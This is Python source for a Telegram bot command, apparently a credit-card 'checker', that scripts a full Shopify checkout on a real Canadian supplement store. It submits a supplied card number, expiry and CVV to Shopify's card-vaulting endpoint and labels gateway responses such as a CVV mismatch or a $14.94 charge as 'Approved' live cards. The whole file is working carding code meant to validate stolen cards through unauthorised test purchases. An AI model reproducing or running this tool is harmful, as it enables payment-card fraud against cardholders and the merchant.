import aiohttp
import re
from asyncio import sleep
import time
import requests
import time
import os
import pyrogram
from pyrogram import Client, filters


def find_between( data, first, last ):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None
  
@Client.on_message(filters.command('pay',prefixes=['.','!','/',',','-','$','%','#']))
async def shopify(client, message):

    ccs = True
    if not ccs:
            await message.reply("Invalid Card")
            return
    data = message.text.split(" ", 2)

    if len(data) < 2:
                await message.reply_text("Invalid Card")
                return

class ShopifyPayflow:

    cc = ''
    mes = ''
    ano = ''
    cvv = ''

    def __init__(self, cc, mes, ano, cvv):
        self.cc = cc 
        self.mes = mes
        self.ano = ano
        self.cvv = cvv

    async def r1(self, session):
        
        headers = {
                    'Host': 'supplementsource.ca',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                }
        
        async with session.get('https://supplementsource.ca/cart/40904653832240:1?traffic_source=buy_now', headers=headers) as r1:
            res1 = await r1.text()

        status = r1.status
        checkouts = res1.split('supplementsource.ca\/7547193\/checkouts\/')[1].split('?')[0]


        authenticity_token = res1.split('name="authenticity_token" value="')[1].split('"')[0]
        return checkouts, authenticity_token, status
    
    async def r2(self, session, checkouts, authenticity_token):

        headers = {
            'authority': 'supplementsource.ca',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-419,es;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://supplementsource.ca',
            'referer': 'https://supplementsource.ca/',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        }

        data = [
            ('_method', 'patch'),
            ('authenticity_token', authenticity_token),
            ('previous_step', 'contact_information'),
            ('step', 'shipping_method'),
            ('checkout[email]', 'pepegfeadf9304@gmail.com'),
            ('checkout[buyer_accepts_marketing]', '0'),
            ('checkout[buyer_accepts_marketing]', '1'),
            ('checkout[shipping_address][first_name]', ''),
            ('checkout[shipping_address][last_name]', ''),
            ('checkout[shipping_address][company]', ''),
            ('checkout[shipping_address][address1]', ''),
            ('checkout[shipping_address][address2]', ''),
            ('checkout[shipping_address][city]', ''),
            ('checkout[shipping_address][country]', ''),
            ('checkout[shipping_address][province]', ''),
            ('checkout[shipping_address][zip]', ''),
            ('checkout[shipping_address][phone]', ''),
            ('checkout[shipping_address][country]', 'Canada'),
            ('checkout[shipping_address][first_name]', 'Juan'),
            ('checkout[shipping_address][last_name]', 'Perez'),
            ('checkout[shipping_address][company]', ''),
            ('checkout[shipping_address][address1]', '1637 Park Ct'),
            ('checkout[shipping_address][address2]', ''),
            ('checkout[shipping_address][city]', 'Drayton Valley'),
            ('checkout[shipping_address][province]', 'AB'),
            ('checkout[shipping_address][zip]', 'T0E 0M0'),
            ('checkout[shipping_address][phone]', '(425) 988-5369'),
            ('checkout[remember_me]', 'false'),
            ('checkout[remember_me]', '0'),
            ('checkout[buyer_accepts_sms]', '0'),
            ('checkout[sms_marketing_phone]', ''),
            ('checkout[client_details][browser_width]', '782'),
            ('checkout[client_details][browser_height]', '750'),
            ('checkout[client_details][javascript_enabled]', '1'),
            ('checkout[client_details][color_depth]', '24'),
            ('checkout[client_details][java_enabled]', 'false'),
            ('checkout[client_details][browser_tz]', '300'),
        ]

        async with session.post('https://supplementsource.ca/7547193/checkouts/'+checkouts, headers=headers, data=data) as r2:
            res2 = await r2.text()

        status = r2.status
        authenticity_token2 = res2.split('name="authenticity_token" value="')[1].split('"')[0]

        return authenticity_token2, status

    async def r3(self, session, checkouts, authenticity_token2):

        headers = {
            'authority': 'supplementsource.ca',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-419,es;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://supplementsource.ca',
            'referer': 'https://supplementsource.ca/',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        }

        data = {
            '_method': 'patch',
            'authenticity_token': authenticity_token2,
            'previous_step': 'shipping_method',
            'step': 'payment_method',
            'checkout[shipping_rate][id]': 'shopify-Canada%20Post-9.95',
            'checkout[client_details][browser_width]': '840',
            'checkout[client_details][browser_height]': '750',
            'checkout[client_details][javascript_enabled]': '1',
            'checkout[client_details][color_depth]': '24',
            'checkout[client_details][java_enabled]': 'false',
            'checkout[client_details][browser_tz]': '300',
        }

        async with session.post('https://supplementsource.ca/7547193/checkouts/'+checkouts, headers=headers, data=data) as r3:
            res3 = await r3.text()
        status = r3.status
        authenticity_token3 = res3.split('name="authenticity_token" value="')[1].split('"')[0]
        return authenticity_token3, status

    def separar(self, session, mes, cc):
        # Creamos una lista para almacenar los grupos de 4 dígitos
        grupos = []

        # Recorremos la cadena en pasos de 4
        for i in range(0, len(cc), 4):
            grupo = cc[i:i+4]
            grupos.append(grupo)

        if mes == "01":
            mes = "1"
        elif mes == "02":
            mes = "2"
        elif mes == "03":
            mes = "3"
        elif mes == "04":
            mes = "4"
        elif mes == "05":
            mes = "5"
        elif mes == "06":
            mes = "6"
        elif mes == "07":
            mes = "7"
        elif mes == "08":
            mes = "8"
        elif mes == "09":
            mes = "9"
        elif mes == "10":
            mes = "10"
        elif mes == "11":
            mes = "11"
        elif mes == "12":
            mes = "12"
        elif mes == "1":
            mes = "1"
        elif mes == "2":
            mes = "2"
        elif mes == "3":
            mes = "3"
        elif mes == "4":
            mes = "4"
        elif mes == "5":
            mes = "5"
        elif mes == "6":
            mes = "6"
        elif mes == "7":
            mes = "7"
        elif mes == "8":
            mes = "8"
        elif mes == "9":
            mes = "9"

        return grupos, mes


    async def r4(self, session, grupos, mes, ano, cvv):

        headers = {
            'Accept': 'application/json',
            'Accept-Language': 'es-419,es;q=0.8',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://checkout.shopifycs.com',
            'Referer': 'https://checkout.shopifycs.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Sec-GPC': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        json_data = {
            'credit_card': {
                'number': grupos[0]+ " " + grupos[1] + " " + grupos[2] + " " + grupos[3],
                'name': 'Luisa',
                'month': mes,
                'year': ano,
                'verification_value': cvv,
            },
            'payment_session_scope': 'supplementsource.ca',
        }

        async with session.post('https://deposit.us.shopifycs.com/sessions', headers=headers, json=json_data) as r4:
            res4 = await r4.text()
        status = r4.status
        sid_match = re.search(r'{"id":"([^"]+)"', res4)
        sid = sid_match.group(1)
        return sid, status

    async def r5(self, session, sid, checkouts, authenticity_token3):

        headers = {
            'authority': 'supplementsource.ca',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-419,es;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://supplementsource.ca',
            'referer': 'https://supplementsource.ca/',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        }

        data = {
            '_method': 'patch',
            'authenticity_token': authenticity_token3,
            'previous_step': 'payment_method',
            'step': '',
            's': sid,
            'checkout[payment_gateway]': '46178948',
            'checkout[credit_card][vault]': 'false',
            'checkout[different_billing_address]': 'false',
            'checkout[total_price]': '1464',
            'complete': '1',
            'checkout[client_details][browser_width]': '823',
            'checkout[client_details][browser_height]': '750',
            'checkout[client_details][javascript_enabled]': '1',
            'checkout[client_details][color_depth]': '24',
            'checkout[client_details][java_enabled]': 'false',
            'checkout[client_details][browser_tz]': '300',
        }
        async with session.post('https://supplementsource.ca/7547193/checkouts/'+checkouts, headers=headers, data=data) as r5:
            res5 = await r5.text()
        status = r5.status
        return status

    

    async def r6(self, session, checkouts):

        headers = {
            'authority': 'supplementsource.ca',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-419,es;q=0.8',
            'referer': 'https://supplementsource.ca/',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        }

        params = {
            'from_processing_page': '1',
        }

        async with session.get('https://supplementsource.ca/7547193/checkouts/'+checkouts+'/processing', headers=headers, params=params) as r6:
            res6 = await r6.text()
        return res6

    def mensaje(self, res6):

        res = None
        mensaje = res6.split('class="notice__content"><p class="notice__text">')[1].split('</p></div></div>')[0]
        if mensaje =="Declined: 15005-This transaction cannot be processed.":
            res = "Dead ❌"
        elif mensaje =="Declined: 10414-Inform the customer that PayPal declined the transaction and to contact PayPal Customer Service.":
            res = "Dead ❌"
        elif mensaje =="CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.":
            res = "Approved ✅"
        elif mensaje == "Field format error: 12002-This transaction cannot be processed due to either missing, incomplete or invalid 3-D Secure authentication values.":
            res = "Declined ❌"
        elif mensaje == "Charged $14.94":
            res = "Approved ✅"
        else:
            res = "Declined ❌"
            print(mensaje)
        


